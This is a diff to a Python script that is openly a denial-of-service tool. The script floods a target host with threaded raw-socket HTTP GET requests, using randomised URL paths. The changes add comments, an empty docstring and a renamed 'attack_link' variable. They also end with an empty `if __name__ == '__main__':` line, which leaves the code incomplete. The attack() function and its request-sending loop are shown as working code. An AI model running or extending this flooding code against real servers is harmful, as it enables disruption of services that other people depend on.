@@ -41,6 +41,7 @@ thread_num_mutex = threading.Lock()
 
 # Print thread status
 def print_status():
+    """Displaying the current thread number"""
     global thread_num
     thread_num_mutex.acquire(True)
 
@@ -51,6 +52,9 @@ def print_status():
 
 # Generate URL Path
 def generate_url_path():
+    """
+
+    """
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, 5))
     return data
@@ -67,10 +71,11 @@ def attack():
     try:
         # Open the connection on that raw socket
         dos.connect((ip, port))
-        
+
         # Send the request according to HTTP spec
-        output = f"GET {url_path} HTTP/1.1\nHost: {host}\n\n"
-        dos.send(output.encode('utf-8'))
+        attack_link = f"GET {url_path} HTTP/1.1\nHost: {host}\n\n"
+        # encoding the attack link to BYTES strings
+        dos.send(attack_link.encode('utf-8'))
         # dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
     except socket.error as e:
         print("\n [No connection, server may be down]: " + str(e))
@@ -95,3 +100,6 @@ for i in range(num_requests):
 
 for current_thread in all_threads:
     current_thread.join()  # Make the main thread wait for the children threads
+
+
+if __name__ == "__main__":
